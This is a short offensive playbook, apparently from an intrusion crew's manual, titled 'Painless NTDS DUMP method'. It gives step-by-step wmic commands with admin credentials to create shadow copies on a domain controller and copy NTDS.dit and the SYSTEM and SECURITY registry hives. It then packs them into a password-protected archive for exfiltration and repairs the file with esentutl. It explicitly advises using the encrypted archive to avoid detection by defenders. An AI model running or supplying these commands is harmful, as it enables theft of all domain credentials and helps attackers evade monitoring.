Painless NTDS DUMP method
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
almost certainly they are already there, if not, we do it ourselves

net start Volume Shadow Copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


further in the listing of shadow copies we find the latest
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
accordingly we need a copy number for the next command


shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"


в c:\temp\log\ должны упасть файлы ntds.dit / security / system
we take a portable console 7z and pack it into an archive with a password
Code: [Highlight]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following


Esentutl /p C:\log\ntds.dit


the trick of this method is that we don’t actually dump anything, we just take and pump out ntds
in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive

if you have troubles with what they fire and throw out of the network after the ntds dump - try this method
it can be burned only by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive
